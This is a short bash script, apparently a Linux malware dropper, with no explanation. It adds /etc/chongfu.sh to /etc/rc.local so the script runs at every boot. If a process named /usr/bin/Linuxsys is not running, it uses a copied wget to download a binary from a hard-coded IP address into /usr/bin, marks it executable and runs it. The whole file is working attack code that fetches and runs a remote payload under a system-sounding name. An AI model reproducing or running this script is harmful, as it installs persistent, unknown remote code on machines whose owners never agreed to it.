#!/bin/bash
x=$(cat /etc/rc.local | grep /etc/chongfu.sh | grep -v grep | wc -l)
if [ $x -eq 0 ];then
    $(sed -i "s/exit 0//g" /etc/rc.local)
    echo "sh /etc/chongfu.sh &" >> /etc/rc.local
    echo "exit 0" >> /etc/rc.local
else
    echo ""
fi

download=$(ps aux | grep /usr/bin/Linuxsys | grep -v grep | wc -l)
if [ $download -eq 0 ];then
	if [ ! -f "/usr/bin/Linuxsys" ];then
		if [ -f "/usr/bin/wget" ];then
			cp /usr/bin/wget /tmp/wget
			chmod +x /tmp/wget
			/tmp/wget -P /usr/bin/ http://45.76.110.81/Linuxsys
			chmod +x /usr/bin/Linuxsys
			chmod 755 /usr/bin/Linuxsys
			/usr/bin/Linuxsys
			rm /tmp/wget
		else
			echo "" #no wget
		fi
	else
		chmod +x /usr/bin/Linuxsys
		/usr/bin/Linuxsys
	fi
else
	echo ""

fi
